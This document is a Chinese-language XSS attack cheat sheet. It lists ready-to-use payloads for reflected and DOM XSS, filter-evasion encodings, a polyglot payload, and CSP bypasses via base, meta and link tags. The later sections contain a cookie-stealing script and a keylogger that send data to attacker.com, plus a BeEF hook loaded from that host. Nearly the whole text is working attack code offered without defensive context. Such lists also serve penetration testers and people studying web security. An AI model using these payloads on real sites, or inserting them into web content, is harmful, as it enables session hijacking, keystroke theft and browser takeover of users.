# XSS跨站脚本攻击

## 1. 反射型XSS

### 基础Payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe src=javascript:alert(1)>
```

## 2. 存储型XSS

同反射型XSS，但payload会存储在服务器端

## 3. DOM型XSS

```javascript
<img src=x onerror=alert(document.domain)>
<svg onload=alert(location.href)>
<a href=javascript:alert(1)>click</a>
```

## 4. mXSS (突变型XSS)

利用浏览器解析差异绕过过滤

## 5. CSP绕过

### base标签绕过

```html
<base href="http://attacker.com/">
```

### meta标签绕过

```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/">
```

### link标签绕过

```html
<link rel="import" href="http://attacker.com/">
```

## 6. 过滤器绕过

### 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
```

### HTML编码绕过

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

### URL编码绕过

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

### Unicode编码绕过

```html
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### 混合编码绕过

## 7. 编码绕过

- HTML实体编码
- URL编码
- Unicode编码
- Base64编码

## 8. Polyglot XSS

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

## 9. Cookie窃取

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>
```

## 10. 键盘记录

```html
<script>
document.onkeypress=function(e){
new Image().src="http://attacker.com/log?k="+e.key;
}
</script>
```

## 11. BeEF利用

```html
<script src="http://attacker.com:3000/hook.js"></script>
```
